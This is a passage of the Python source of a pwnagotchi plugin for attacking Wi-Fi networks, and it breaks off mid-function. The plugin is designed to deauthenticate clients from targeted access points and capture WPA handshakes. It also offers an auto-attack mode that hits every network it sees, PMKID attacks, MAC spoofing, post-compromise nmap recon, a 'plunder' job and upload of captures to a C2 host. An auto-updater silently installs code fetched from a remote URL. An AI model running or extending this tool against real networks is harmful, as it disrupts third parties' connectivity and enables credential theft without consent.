"""
wd_scanner.py - pwnagotchi plugin

THREE-RADIO SETUP for optimal operation:
  - RADIO 1 (pwnagotchi main): Left alone - continues normal pwnagotchi operations
  - RADIO 2 (aux/attack radio): Selected via web UI, performs all deauth attacks
  - RADIO 3 (passive monitor): Continuously scans all channels, maintains network list,
                                captures handshakes passively

When a target is picked, the plugin:
  1. Uses RADIO 2 (aux) to send deauthentication frames at the target BSSID.
  2. RADIO 3 (passive monitor) captures the handshakes (already running continuously).
  3. Pwnagotchi's MAIN radio (RADIO 1) is never disturbed.

The passive monitor (RADIO 3) runs airodump-ng continuously with channel hopping,
maintaining an always-current list of networks and capturing handshakes opportunistically.
This eliminates the need for manual scans and maximizes handshake capture rate.

Install:
  - Drop this file into your custom_plugins folder (see main.custom_plugins
    in /etc/pwnagotchi/config.toml).
  - Add to config.toml:

        main.plugins.wd_scanner.enabled = true
        main.plugins.wd_scanner.scan_seconds = 15            # default scan length
        main.plugins.wd_scanner.deauth_listen_seconds = 30   # capture window
        main.plugins.wd_scanner.deauth_bursts = 5            # deauth packets per burst

  - Restart pwnagotchi (`systemctl restart pwnagotchi`).
  - Browse to http://<pwnagotchi>:8080/plugins/wd_scanner
  - Pick the auxiliary radio from the dropdown and tap SELECT. Tap RELEASE
    when you want to free it (e.g. before unplugging the dongle).

The aux interface is chosen at runtime from the web UI - never hard-coded.
The dropdown re-enumerates every render, so if a USB radio changes name
(wlan1 -> wlan2 after a replug) it just shows up under its new name.

Dependencies (already on a stock pwnagotchi image):
  - aircrack-ng suite (airmon-ng, airodump-ng)
  - iw

When you SELECT an interface the plugin puts it into monitor mode (airmon-ng
start). RELEASE / on_unload reverts it to managed.
"""

import csv
import glob
import hashlib
import json
import logging
import os
import random
import re
import shutil
import signal
import socket
import subprocess
import tempfile
import threading
import time
import urllib.request
from html import escape

import pwnagotchi.plugins as plugins


_DEFAULT_UPDATE_URL = (
    "https://raw.githubusercontent.com/Deloril/pwn-plugins/main/wd_scanner/wd_scanner.py"
)


class WdScanner(plugins.Plugin):
    __author__ = "you@example.com"
    __version__ = "2.8.8"
    __license__ = "GPL3"
    __description__ = (
        "Three-radio setup: passive monitor (radio 3) maintains network list, "
        "aux radio (radio 2) performs attacks, pwnagotchi main (radio 1) left undisturbed."
    )

    # ---------------------------------------------------------------- lifecycle

    def __init__(self):
        self._agent = None
        self._lock = threading.Lock()

        # Config (filled in on_loaded).
        self._scan_seconds = 15
        self._listen_seconds = 30
        self._deauth_bursts = 5

        # Runtime state - selection happens via the web UI.
        self._iface_cfg = None              # currently selected aux iface (user-picked)
        self._mon_iface = None              # actual mon iface after airmon-ng (e.g. wlan1mon)
        self._select_error = None           # last selection error to surface in UI
        # When the chosen iface is on the same phy as pwnagotchi's main radio
        # we run in "shared" mode: scans come from bettercap's session data
        # (no second monitor vif on the same radio), and attacks pause/resume
        # pwnagotchi's normal recon to keep the radio pinned during the
        # capture window.
        self._shared_radio = False
        self._was_paused = False
        # `True` iff the user has explicitly selected the main radio in
        # shared mode. Useful for UI badges.
        self._allow_shared = True

        # Passive monitor radio (third radio for continuous handshake capture).
        self._passive_iface_cfg = None      # passive monitor iface (user-picked)
        self._passive_mon_iface = None      # actual mon iface after airmon-ng
        self._passive_thread = None         # airodump-ng thread
        self._passive_running = False
        self._passive_stop = threading.Event()
        self._passive_log = []              # rolling log
        self._passive_handshakes = 0        # counter of handshakes captured

        self._scan_thread = None
        self._scan_running = False
        self._scan_started_at = 0
        self._last_scan_results = []        # list of dicts: ssid, bssid, channel, power, clients
        self._last_scan_error = None

        self._action_thread = None
        self._action_running = False
        self._action_log = []               # rolling log of last attack

        # Handshake notification state.
        self._new_handshakes = []             # list of filenames captured since last dismiss
        self._handshake_toast_dismissed = 0   # epoch of last dismiss

        # Background monitor thread (passive listening when idle).
        self._bg_monitor_thread = None
        self._bg_monitor_stop = threading.Event()

        # Recon-on-pwned state.
        self._recon_thread = None
        self._recon_running = False
        self._recon_log = []
        self._recon_seconds = 60             # nmap timeout cap
        self._recon_subnet_max = 256         # never sweep more than /24
        self._recon_dwell = 8                # seconds to wait for DHCP
        # Channel shotgun config.
        self._shotgun_listen_seconds = 30
        self._shotgun_burst_per_bssid = 3

        # Plunder state.
        self._plunder_thread = None
        self._plunder_running = False
        self._plunder_log = []
        self._plunder_seconds = 300          # total budget per plunder job

        # PMKID attack state.
        self._pmkid_attack_mode = False      # use PMKID instead of deauth
        self._pmkid_available = False        # set after checking for hcxdumptool

        # Target filtering.
        self._filter_min_signal = -100       # dBm
        self._filter_min_clients = 0
        self._filter_security = []           # list: ["WPA2", "WPA3", etc.] empty = all
        self._filter_hide_pwned = False

        # Auto-attack mode.
        self._auto_attack = False            # attack everything seen during scan
        self._auto_attack_history = set()    # BSSIDs already auto-attacked

        # Network notes (persisted).
        self._notes = {}                     # {bssid: "note text"}
        self._notes_file = None              # path set in on_loaded

        # MAC randomization.
        self._mac_random_enabled = False
        self._mac_random_oui = None          # "Apple", "Samsung", etc.

        # C2 upload state (ephemeral - no disk persistence).
        self._c2_host = None                 # "user@host:port"
        self._c2_upload_running = False
        self._c2_upload_log = []

        # Debug mode.
        self._debug_enabled = False
        self._debug_log = []

        # Auto-updater state.
        self._update_url = _DEFAULT_UPDATE_URL
        self._update_check_interval = 24 * 3600   # seconds between checks
        self._update_auto_install = True
        self._update_lock = threading.Lock()
        self._update_thread = None
        self._update_in_flight = False
        self._update_last_check = 0          # epoch
        self._update_last_status = None      # "up-to-date" / "update available" / error string
        self._update_remote_version = None   # parsed __version__ from remote
        self._update_remote_sha = None       # sha256 of remote bytes
        self._update_local_sha = None
        self._update_pending_restart = False  # set after a successful install

    def on_loaded(self):
        opts = self.options or {}
        self._scan_seconds = int(opts.get("scan_seconds", 15))
        self._listen_seconds = int(opts.get("deauth_listen_seconds", 30))
        self._deauth_bursts = int(opts.get("deauth_bursts", 5))

        # Updater config.
        self._update_url = str(opts.get("update_url", _DEFAULT_UPDATE_URL))
        self._update_check_interval = int(opts.get("update_check_interval", 24 * 3600))
        self._update_auto_install = bool(opts.get("update_auto_install", True))

        # Shared-radio mode (single-radio fallback). Default ON so a Pi Zero
        # with one Wi-Fi adapter Just Works.
        self._allow_shared = bool(opts.get("allow_shared", True))

        # Recon-on-pwned config.
        self._recon_seconds = int(opts.get("recon_seconds", 60))
        self._recon_subnet_max = int(opts.get("recon_subnet_max", 256))
        self._recon_dwell = int(opts.get("recon_dhcp_dwell", 8))

        # Shotgun config.
        self._shotgun_listen_seconds = int(
            opts.get("shotgun_listen_seconds", 30)
        )
        self._shotgun_burst_per_bssid = int(
            opts.get("shotgun_burst_per_bssid", 3)
        )

        # Plunder config.
        self._plunder_seconds = int(opts.get("plunder_seconds", 300))

        # Auto-attack config.
        self._auto_attack = bool(opts.get("auto_attack", False))

        # C2 config (host only, key uploaded per-session).
        self._c2_host = opts.get("c2_host", "")  # format: "user@host:port"

        # MAC randomization config.
        self._mac_random_enabled = bool(opts.get("mac_random_enabled", False))
        self._mac_random_oui = opts.get("mac_random_oui", None)

        # Check for PMKID tools.
        self._pmkid_available = (
            shutil.which("hcxdumptool") is not None
            and shutil.which("hcxpcapngtool") is not None
        )

        if shutil.which("airodump-ng") is None or shutil.which("airmon-ng") is None:
            logging.error("[wd_scanner] aircrack-ng suite not found on PATH.")
            return

        try:
            self._update_local_sha = self._sha256_of_self()
        except Exception:
            self._update_local_sha = None

        logging.info(
            "[wd_scanner] loaded v%s; pick an aux radio from /plugins/wd_scanner/",
            self.__version__,
        )
        if self._pmkid_available:
            logging.info("[wd_scanner] PMKID attack mode available (hcxdumptool detected)")
        if self._auto_attack:
            logging.info("[wd_scanner] AUTO-ATTACK enabled: will attack all targets during scans")

    def on_ready(self, agent):
        self._agent = agent

        # Setup notes file now that agent is available.
        try:
            handshakes = agent.config()["bettercap"]["handshakes"]
            self._notes_file = os.path.join(handshakes, "wd_scanner_notes.json")
            self._load_notes()
        except Exception as e:
            logging.warning("[wd_scanner] failed to setup notes file: %s", e)
            self._notes_file = None

        logging.info("[wd_scanner] agent ready, plugin armed.")

    def on_internet_available(self, agent):
        # Pwnagotchi calls this periodically while online. We rate-limit
        # ourselves to update_check_interval to avoid hammering GitHub.
        try:
            self._maybe_run_update_check(force=False)
        except Exception:
            logging.exception("[wd_scanner] auto-update check failed")

    def on_unload(self, ui):
        try:
            self._stop_bg_monitor()
        except Exception:
            pass
        try:
            self._stop_scan()
        except Exception:
            pass
        try:
            self._stop_passive_monitor()
        except Exception:
            pass
        try:
            self._restore_managed_mode()
        except Exception:
            pass
        try:
            self._restore_passive_managed_mode()
        except Exception:
            pass
        logging.info("[wd_scanner] unloaded.")

    # --------------------------------------------------------- iface enumeration

    @staticmethod
    def _iface_name_ok(name):
        # Conservative: alphanumeric, dash, dot, underscore. No shell metacharacters.
        return bool(re.match(r"^[A-Za-z0-9._-]{1,15}$", name or ""))

    def _list_wireless_ifaces(self):
        """
        Return [{name, type, addr, shared, role}] for every wireless device.

        - `type` is the iw mode: 'managed' / 'monitor' / 'unknown'.
        - `shared` is True if this iface lives on the same phy as
          pwnagotchi's main radio (i.e. selecting it means pausing
          pwnagotchi during scans/attacks).
        - `role` is 'dedicated' or 'shared' for the UI.
        """
        names = []
        try:
            for n in sorted(os.listdir("/sys/class/net")):
                if os.path.isdir("/sys/class/net/%s/wireless" % n) or \
                   os.path.exists("/sys/class/net/%s/phy80211" % n):
                    names.append(n)
        except FileNotFoundError:
            pass

        iw_out = self._run(["iw", "dev"], check=False, timeout=5) or ""
        for m in re.finditer(r"Interface\s+(\S+)", iw_out):
            n = m.group(1)
            if n not in names:
                names.append(n)

        main_iface = pwnagotchi_config_main_iface()
        main_phy = self._iface_phy(main_iface) if main_iface else None
        # Hide bettercap's own monitor vif (e.g. mon0 for wlan0): showing it
        # only confuses the user, and selecting it would yank the radio out
        # from under bettercap mid-attack.
        hide = set()
        if main_iface:
            hide.add(main_iface)

        result = []
        for n in names:
            if n in hide:
                continue
            phy = self._iface_phy(n)
            shared = bool(main_phy and phy == main_phy)
            info = self._run(["iw", "dev", n, "info"], check=False, timeout=3) or ""
            if "type monitor" in info:
                t = "monitor"
            elif "type managed" in info:
                t = "managed"
            else:
                t = "unknown"
            addr = ""
            try:
                with open("/sys/class/net/%s/address" % n, "r") as f:
                    addr = f.read().strip()
            except OSError:
                pass
            result.append({
                "name": n,
                "type": t,
                "addr": addr,
                "shared": shared,
                "role": "shared" if shared else "dedicated",
            })

        # Sort: dedicated radios first, then shared. Stable inside each group.
        result.sort(key=lambda i: (1 if i["shared"] else 0, i["name"]))
        return result

    def _iface_phy(self, iface):
        """Return the phy backing `iface`, e.g. 'phy0', or None."""
        try:
            target = os.readlink("/sys/class/net/%s/phy80211" % iface)
            return os.path.basename(target)
        except OSError:
            return None

    # ------------------------------------------------------------------ debug

    def _log_debug(self, msg, level="INFO"):
        """Log debug message when debug mode enabled."""
        if not self._debug_enabled:
            return
        ts = time.strftime("%H:%M:%S")
        line = "[%s] [%s] %s" % (ts, level, msg)
        self._debug_log.append(line)
        if len(self._debug_log) > 500:
            self._debug_log = self._debug_log[-500:]

    def _capture_exception(self, context):
        """Capture exception details to debug log."""
        if not self._debug_enabled:
            return
        import traceback
        tb = traceback.format_exc()
        self._log_debug("EXCEPTION in %s:\n%s" % (context, tb), "ERROR")

    # ------------------------------------------------------- notes persistence

    def _load_notes(self):
        """Load network notes from disk."""
        if not self._notes_file:
            return
        try:
            if os.path.exists(self._notes_file):
                with open(self._notes_file, "r") as f:
                    self._notes = json.load(f)
        except Exception as e:
            logging.warning("[wd_scanner] failed to load notes: %s", e)
            self._notes = {}

    def _save_notes(self):
        """Save network notes to disk."""
        if not self._notes_file:
            return
        try:
            with open(self._notes_file, "w") as f:
                json.dump(self._notes, f, indent=2)
        except Exception as e:
            logging.warning("[wd_scanner] failed to save notes: %s", e)

    def _set_note(self, bssid, note):
        """Set or clear a note for a BSSID."""
        bssid = bssid.lower()
        if note and note.strip():
            self._notes[bssid] = note.strip()
        else:
            self._notes.pop(bssid, None)
        self._save_notes()

    def _get_note(self, bssid):
        """Get note for a BSSID, or empty string."""
        return self._notes.get(bssid.lower(), "")

    # -------------------------------------------------------- MAC randomization

    _MAC_OUI_PRESETS = {
        "Apple": "00:17:F2",
        "Samsung": "00:12:FB",
        "Dell": "00:14:22",
        "Intel": "00:1B:77",
        "Cisco": "00:0A:41",
        "HP": "00:17:08",
        "Asus": "00:1F:C6",
        "Microsoft": "00:50:F2",
    }

    def _randomize_mac(self, iface):
        """Randomize MAC address on interface."""
        if not self._mac_random_enabled:
            return
        try:
            # Generate random MAC.
            if self._mac_random_oui and self._mac_random_oui in self._MAC_OUI_PRESETS:
                oui = self._MAC_OUI_PRESETS[self._mac_random_oui]
                # Random NIC portion.
                nic = ":".join(["%02x" % random.randint(0, 255) for _ in range(3)])
                mac = "%s:%s" % (oui, nic)
            else:
                # Fully random MAC with local bit set.
                mac = "%02x" % (random.randint(0, 255) | 0x02)  # locally administered
                mac += "".join([":%02x" % random.randint(0, 255) for _ in range(5)])

            self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
            self._run(["ip", "link", "set", iface, "address", mac], check=False, timeout=5)
            self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
            logging.info("[wd_scanner] randomized MAC on %s to %s", iface, mac)
        except Exception as e:
            logging.warning("[wd_scanner] MAC randomization failed: %s", e)

    # ---------------------------------------------------------- iface selection

    def _select_iface(self, name):
        """User picked an iface in the UI. Validate, claim, prep for use."""
        with self._lock:
            self._select_error = None

            if self._scan_running or self._action_running:
                return False, "busy: scan or attack in progress"

            if not self._iface_name_ok(name):
                return False, "invalid interface name"

            if not os.path.isdir("/sys/class/net/%s" % name):
                return False, "%s does not exist" % name

            main_iface = pwnagotchi_config_main_iface()
            shared = False
            if main_iface:
                if name == main_iface:
                    if not self._allow_shared:
                        return False, "%s is pwnagotchi's main radio" % name
                    shared = True
                else:
                    main_phy = self._iface_phy(main_iface)
                    if main_phy and self._iface_phy(name) == main_phy:
                        if not self._allow_shared:
                            return (
                                False,
                                "%s is on the same phy (%s) as pwnagotchi's main radio"
                                % (name, main_phy),
                            )
                        shared = True

            # If a different iface was previously selected, release it first.
            if self._mon_iface and self._mon_iface != name and self._iface_cfg != name:
                self._restore_managed_mode()

            self._iface_cfg = name
            self._shared_radio = shared

            if shared:
                # Don't try to add a second monitor vif on the same phy.
                # Bettercap is already in monitor mode on this radio; we'll
                # piggy-back on its scan and attack APIs and just pause/
                # resume around our work.
                self._mon_iface = main_iface  # for display only
                return True, "selected %s (shared with pwnagotchi)" % name

            mon = self._ensure_monitor_mode()
            if not mon:
                self._select_error = "could not enable monitor mode on %s" % name
                self._iface_cfg = None
                return False, self._select_error
            return True, "selected %s (mon=%s)" % (name, mon)

    def _release_iface(self):
        with self._lock:
            if self._scan_running or self._action_running:
                return False, "busy: scan or attack in progress"
            if self._shared_radio:
                # Make sure pwnagotchi is back to normal even if a worker
                # crashed without resuming it.
                self._resume_pwnagotchi()
                self._shared_radio = False
                self._mon_iface = None
            else:
                self._restore_managed_mode()
            self._iface_cfg = None
            self._last_scan_results = []
            self._last_scan_error = None
            return True, "released"

    def _select_passive_iface(self, name):
        """Select the passive monitor radio (third radio for continuous capture)."""
        with self._lock:
            self._select_error = None

            if not self._iface_name_ok(name):
                return False, "invalid interface name"

            if not os.path.isdir("/sys/class/net/%s" % name):
                return False, "%s does not exist" % name

            # Make sure it's not the main radio or the active aux radio.
            main_iface = pwnagotchi_config_main_iface()
            if name == main_iface or name == self._iface_cfg:
                return False, "%s is already in use" % name

            # Stop existing passive monitor if running.
            if self._passive_running:
                self._stop_passive_monitor()

            # Release old passive interface if any.
            if self._passive_mon_iface:
                self._restore_passive_managed_mode()

            self._passive_iface_cfg = name

            # Put it into monitor mode.
            self._unmanage_iface(name)
            result = self._run(["airmon-ng", "start", name], check=False, timeout=15)
            if not result:
                self._passive_iface_cfg = None
                return False, "airmon-ng failed for %s" % name

            # Detect the monitor interface name.
            mon_iface = None
            for line in result.split("\n"):
                m = re.search(r"monitor mode (?:vif )?enabled (?:for|on) (\w+)", line, re.I)
                if m:
                    mon_iface = m.group(1)
                    break
            if not mon_iface:
                mon_iface = name + "mon"
                if not os.path.isdir("/sys/class/net/%s" % mon_iface):
                    self._passive_iface_cfg = None
                    return False, "could not find monitor interface"

            self._passive_mon_iface = mon_iface

            # Start passive monitoring.
            self._start_passive_monitor()

            return True, "passive monitor started on %s (mon=%s)" % (name, mon_iface)

    def _release_passive_iface(self):
        """Release the passive monitor radio."""
        with self._lock:
            self._stop_passive_monitor()
            self._restore_passive_managed_mode()
            self._passive_iface_cfg = None
            return True, "released passive monitor"

    # ------------------------------------------------- pwnagotchi pause/resume

    def _pause_pwnagotchi(self):
        """Tell bettercap to stop using the radio while we work."""
        if self._was_paused:
            return
        agent = self._agent
        if agent is None:
            return
        try:
            agent.run("wifi.recon off")
            self._log_action("paused pwnagotchi recon (shared radio)")
            self._was_paused = True
        except Exception as e:
            self._log_action("could not pause pwnagotchi: %s" % e)

    def _resume_pwnagotchi(self):
        agent = self._agent
        if agent is None or not self._was_paused:
            self._was_paused = False
            return
        try:
            # Clear any pinned channel and get hopping again.
            try:
                agent.run("wifi.recon.channel clear")
            except Exception:
                pass
            agent.run("wifi.recon on")
            self._log_action("resumed pwnagotchi recon")
        except Exception as e:
            self._log_action("could not resume pwnagotchi: %s" % e)
        finally:
            self._was_paused = False

    # ------------------------------------------------------------- monitor mode

    def _ensure_monitor_mode(self):
        """Put the aux interface in monitor mode using airmon-ng.

        IMPORTANT: never run `airmon-ng check kill`. That nukes
        NetworkManager + wpa_supplicant globally, which breaks the
        Bluetooth-tether path users rely on to reach the web UI in the
        first place. Instead we unmanage just THIS iface and stop only
        the wpa_supplicant instance attached to it.
        """
        if not self._iface_cfg:
            return None

        # If user gave us something already in monitor mode, just trust it.
        if self._is_monitor(self._iface_cfg):
            self._mon_iface = self._iface_cfg
            return self._mon_iface

        # Per-iface unmanage. Leave the rest of the system alone.
        self._unmanage_iface(self._iface_cfg)

        out = self._run(
            ["airmon-ng", "start", self._iface_cfg], check=False, timeout=15
        ) or ""
        # airmon-ng prints either "monitor mode vif enabled on [phyN]wlan1mon"
        # or "monitor mode enabled on wlan1".
        m = re.search(r"monitor mode (?:vif )?enabled (?:on |for )\[?\w*\]?(\w+)", out)
        if m:
            self._mon_iface = m.group(1)
        else:
            # Fallbacks: some drivers just rename to <iface>mon, others keep name.
            for cand in (self._iface_cfg + "mon", self._iface_cfg):
                if self._iface_exists(cand) and self._is_monitor(cand):
                    self._mon_iface = cand
                    break

        if not self._mon_iface:
            logging.error(
                "[wd_scanner] failed to enable monitor mode on %s "
                "(other connections were NOT touched)",
                self._iface_cfg,
            )
        return self._mon_iface

    def _restore_managed_mode(self):
        if not self._mon_iface:
            return
        self._run(["airmon-ng", "stop", self._mon_iface], check=False, timeout=15)
        # Hand the iface back to NetworkManager (if it was managing it).
        if self._iface_cfg:
            self._remanage_iface(self._iface_cfg)
        self._mon_iface = None

    def _restore_passive_managed_mode(self):
        """Restore passive monitor radio to managed mode."""
        if not self._passive_mon_iface:
            return
        self._run(["airmon-ng", "stop", self._passive_mon_iface], check=False, timeout=15)
        if self._passive_iface_cfg:
            self._remanage_iface(self._passive_iface_cfg)
        self._passive_mon_iface = None

    # ------------------------------------ targeted (non-global) unmanage ----

    def _unmanage_iface(self, iface):
        """
        Free `iface` from any userspace that might fight us, WITHOUT
        touching other interfaces. Specifically:
          * tell NetworkManager to ignore just this iface
          * stop only the wpa_supplicant instance bound to this iface
          * release any DHCP lease on this iface
        Other interfaces (bnep0 over BT, eth0, the pwnagotchi tether, ...)
        keep running.
        """
        if not iface:
            return
        # NetworkManager: per-iface unmanage. Best-effort; nmcli may not be
        # installed on a stock pwnagotchi image and that's fine.
        if shutil.which("nmcli"):
            self._run(["nmcli", "device", "set", iface, "managed", "no"],
                      check=False, timeout=5)

        # wpa_supplicant: prefer the control socket so we kill the right one.
        if shutil.which("wpa_cli"):
            self._run(["wpa_cli", "-i", iface, "terminate"],
                      check=False, timeout=5)
        # Belt-and-braces: kill only processes whose argv contains "-i <iface>".
        # We never use plain `pkill -x wpa_supplicant` here because that would
        # take down ANY wpa_supplicant on the system, including the one
        # NetworkManager is using for your tether/uplink.
        self._run(
            ["pkill", "-f", r"wpa_supplicant.*-i\s*%s(\s|$)" % re.escape(iface)],
            check=False, timeout=5,
        )

        # dhclient lease release scoped to this iface only.
        if shutil.which("dhclient"):
            self._run(["dhclient", "-r", iface], check=False, timeout=5)

    def _remanage_iface(self, iface):
        """Reverse of _unmanage_iface."""
        if not iface:
            return
        if shutil.which("nmcli"):
            self._run(["nmcli", "device", "set", iface, "managed", "yes"],
                      check=False, timeout=5)

    def _is_monitor(self, iface):
        out = self._run(["iw", "dev", iface, "info"], check=False, timeout=5) or ""
        return "type monitor" in out

    def _iface_exists(self, iface):
        return os.path.isdir("/sys/class/net/%s" % iface)

    # -------------------------------------------------------------------- scan

    def _start_scan(self, seconds=None):
        with self._lock:
            if self._scan_running:
                return False, "scan already running"
            if not self._shared_radio and not self._ensure_monitor_mode():
                return False, "monitor mode unavailable on %s" % self._iface_cfg
            seconds = int(seconds or self._scan_seconds)
            self._scan_running = True
            self._scan_started_at = time.time()
            self._last_scan_error = None
            target = (
                self._scan_worker_shared
                if self._shared_radio
                else self._scan_worker
            )
            self._scan_thread = threading.Thread(
                target=target, args=(seconds,), daemon=True,
            )
            self._scan_thread.start()
            return True, "scan started for %ds" % seconds

    def _stop_scan(self):
        self._scan_running = False

    def _scan_worker_shared(self, seconds):
        """Shared-radio scan: poll bettercap session for `seconds`, aggregate."""
        agent = self._agent
        try:
            if agent is None:
                self._last_scan_error = "agent not ready"
                return
            self._log_action(
                "shared-radio scan: harvesting bettercap session for %ds" % seconds
            )
            deadline = time.time() + seconds
            best = {}  # bssid -> ap dict
            while time.time() < deadline and self._scan_running:
                try:
                    sess = agent.session() or {}
                    aps = (sess.get("wifi") or {}).get("aps") or []
                except Exception as e:
                    self._last_scan_error = "session error: %s" % e
                    return
                for a in aps:
                    bssid = (a.get("mac") or a.get("bssid") or "").lower()
                    if not re.match(r"^[0-9a-f:]{17}$", bssid):
                        continue
                    ssid = a.get("hostname") or a.get("ssid") or "<hidden>"
                    try:
                        ch = int(a.get("channel") or 0)
                    except (TypeError, ValueError):
                        ch = 0
                    try:
                        rssi = int(a.get("rssi") or -100)
                    except (TypeError, ValueError):
                        rssi = -100
                    clients = a.get("clients") or []
                    cl = len(clients) if isinstance(clients, list) else 0
                    enc = a.get("encryption") or "OPN"
                    cur = best.get(bssid)
                    # Keep the strongest reading we've seen.
                    if (cur is None) or (rssi > cur["power"]):
                        best[bssid] = {
                            "bssid": bssid,
                            "channel": ch,
                            "power": rssi,
                            "ssid": ssid or "<hidden>",
                            "clients": cl,
                            "encryption": enc,
                        }
                    elif cl > cur["clients"]:
                        cur["clients"] = cl
                time.sleep(1.5)

            results = list(best.values())
            def _rank(a):
                p = a["power"]
                if p == -1:
                    p = -100
                return -p
            results.sort(key=_rank)
            self._last_scan_results = results

            # Auto-attack if enabled.
            if self._auto_attack:
                self._trigger_auto_attack()
        finally:
            self._scan_running = False

    def _scan_worker(self, seconds):
        tmpdir = "/tmp/wd_scanner"
        try:
            os.makedirs(tmpdir, exist_ok=True)
            for f in glob.glob(os.path.join(tmpdir, "scan-*")):
                try:
                    os.remove(f)
                except OSError:
                    pass

            prefix = os.path.join(tmpdir, "scan")
            cmd = [
                "airodump-ng",
                "--write-interval", "1",
                "--output-format", "csv",
                "-w", prefix,
                self._mon_iface,
            ]
            logging.info("[wd_scanner] running: %s", " ".join(cmd))
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid,
            )

            deadline = time.time() + seconds
            try:
                while time.time() < deadline and self._scan_running:
                    time.sleep(0.5)
            finally:
                try:
                    os.killpg(proc.pid, signal.SIGINT)
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        os.killpg(proc.pid, signal.SIGKILL)
                    except Exception:
                        pass

            csvs = sorted(glob.glob(prefix + "-*.csv"))
            if not csvs:
                self._last_scan_error = "no CSV produced by airodump-ng"
                return
            self._last_scan_results = self._parse_airodump_csv(csvs[-1])

            # Auto-attack if enabled.
            if self._auto_attack:
                self._trigger_auto_attack()
        except Exception as e:
            logging.exception("[wd_scanner] scan failed")
            self._last_scan_error = str(e)
        finally:
            self._scan_running = False

    # ------------------------------------------------------ background monitor

    def _start_bg_monitor(self):
        """Start background passive monitoring (refreshes network list when idle)."""
        if self._bg_monitor_thread and self._bg_monitor_thread.is_alive():
            return
        self._bg_monitor_stop.clear()
        self._bg_monitor_thread = threading.Thread(
            target=self._bg_monitor_loop, daemon=True
        )
        self._bg_monitor_thread.start()

    def _stop_bg_monitor(self):
        self._bg_monitor_stop.set()

    def _bg_monitor_loop(self):
        """Continuously refresh the network list by polling bettercap session
        every few seconds while the interface is selected and idle."""
        while not self._bg_monitor_stop.is_set():
            # Only poll when idle (no scan/attack/recon running) and iface selected.
            if (self._iface_cfg and not self._scan_running
                    and not self._action_running and not self._recon_running):
                try:
                    self._bg_poll_once()
                except Exception:
                    pass
            # Sleep in small increments so we can stop quickly.
            for _ in range(10):
                if self._bg_monitor_stop.is_set():
                    return
                time.sleep(1)

    def _bg_poll_once(self):
        """Single passive refresh cycle."""
        agent = self._agent
        if agent is None:
            return
        try:
            sess = agent.session() or {}
            aps = (sess.get("wifi") or {}).get("aps") or []
        except Exception:
            return
        best = {}
        for a in aps:
            bssid = (a.get("mac") or a.get("bssid") or "").lower()
            if not re.match(r"^[0-9a-f:]{17}$", bssid):
                continue
            ssid = a.get("hostname") or a.get("ssid") or "<hidden>"
            try:
                ch = int(a.get("channel") or 0)
            except (TypeError, ValueError):
                ch = 0
            try:
                rssi = int(a.get("rssi") or -100)
            except (TypeError, ValueError):
                rssi = -100
            clients = a.get("clients") or []
            cl = len(clients) if isinstance(clients, list) else 0
            enc = a.get("encryption") or "OPN"
            cur = best.get(bssid)
            if (cur is None) or (rssi > cur["power"]):
                best[bssid] = {
                    "bssid": bssid,
                    "channel": ch,
                    "power": rssi,
                    "ssid": ssid or "<hidden>",
                    "clients": cl,
                    "encryption": enc,
                }
            elif cl > cur["clients"]:
                cur["clients"] = cl

        if best:
            results = list(best.values())
            def _rank(a):
                p = a["power"]
                if p == -1:
                    p = -100
                return -p
            results.sort(key=_rank)
            self._last_scan_results = results

    # -------------------------------- passive monitor (third radio) ----

    def _start_passive_monitor(self):
        """Start passive monitoring on the third radio (all channels, handshake capture)."""
        if self._passive_running or (self._passive_thread and self._passive_thread.is_alive()):
            return
        if not self._passive_iface_cfg:
            return
        self._passive_stop.clear()
        self._passive_running = True
        self._passive_log = []
        self._passive_thread = threading.Thread(
            target=self._passive_monitor_loop, daemon=True
        )
        self._passive_thread.start()
        self._log_passive("passive monitor started on %s" % self._passive_iface_cfg)

    def _stop_passive_monitor(self):
        """Stop passive monitoring."""
        if not self._passive_running:
            return
        self._passive_stop.set()
        self._passive_running = False
        if self._passive_thread:
            self._passive_thread.join(timeout=5)
        self._log_passive("passive monitor stopped")

    def _log_passive(self, msg):
        """Append a message to the passive monitor log."""
        ts = time.strftime("[%H:%M:%S]")
        line = "%s %s" % (ts, msg)
        self._passive_log.append(line)
        if len(self._passive_log) > 200:
            self._passive_log = self._passive_log[-200:]
        logging.info("[wd_scanner] [passive] %s" % msg)

    def _passive_monitor_loop(self):
        """
        Continuously run airodump-ng on all channels (channel hopping).
        Parse network list and captured handshakes, copy handshakes to bettercap's handshake folder.
        """
        if not self._passive_mon_iface:
            self._log_passive("ERROR: no monitor interface available")
            self._passive_running = False
            return

        # Get handshake output directory.
        try:
            handshake_dir = self._agent.config()["bettercap"]["handshakes"]
        except Exception:
            handshake_dir = "/root/handshakes"

        # Create temporary directory for airodump-ng output.
        temp_dir = tempfile.mkdtemp(prefix="wd_passive_")
        self._log_passive("temp dir: %s" % temp_dir)
        self._log_passive("handshake dir: %s" % handshake_dir)

        try:
            # Start airodump-ng with channel hopping across all channels.
            # Write captures to temp directory, prefix "passive".
            # Include CSV output to maintain network list.
            cmd = [
                "airodump-ng",
                "--channel", "1,2,3,4,5,6,7,8,9,10,11,12,13",  # 2.4GHz channels
                "-w", os.path.join(temp_dir, "passive"),
                "--output-format", "pcap,csv",  # both pcap for handshakes and CSV for network list
                self._passive_mon_iface,
            ]
            self._log_passive("cmd: %s" % " ".join(cmd))

            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            self._log_passive("airodump-ng started (PID %d)" % proc.pid)

            # Monitor loop: check for new handshakes and update network list every 10 seconds.
            last_check = 0
            while not self._passive_stop.is_set():
                time.sleep(1)

                # Every 10 seconds, check for handshakes and update network list.
                if time.time() - last_check >= 10:
                    last_check = time.time()
                    self._check_passive_handshakes(temp_dir, handshake_dir)
                    self._update_network_list_from_passive(temp_dir)

            # Stop airodump-ng.
            self._log_passive("stopping airodump-ng...")
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            # Final handshake check and network list update.
            self._check_passive_handshakes(temp_dir, handshake_dir)
            self._update_network_list_from_passive(temp_dir)

        except Exception as e:
            self._log_passive("ERROR: %s" % str(e))
        finally:
            # Clean up temp directory.
            try:
                shutil.rmtree(temp_dir)
            except Exception:
                pass
            self._passive_running = False

    def _check_passive_handshakes(self, temp_dir, handshake_dir):
        """
